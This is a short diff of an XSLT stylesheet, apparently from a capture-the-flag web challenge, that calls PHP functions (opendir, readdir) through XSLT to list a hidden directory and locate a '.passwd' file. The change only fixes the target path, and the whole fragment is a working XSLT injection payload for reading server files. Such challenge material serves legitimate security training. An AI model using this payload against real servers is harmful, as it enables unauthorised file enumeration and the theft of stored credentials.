@@ -3,7 +3,7 @@
      xmlns:php="http://php.net/xsl" exclude-result-prefixes="php">
   <xsl:template match="/">
 
-	  <xsl:value-of select="php:function('opendir','/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
+	  <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
 <xsl:value-of select="php:function('readdir')"/>
 <xsl:value-of select="php:function('readdir')"/>
 <xsl:value-of select="php:function('readdir')"/>
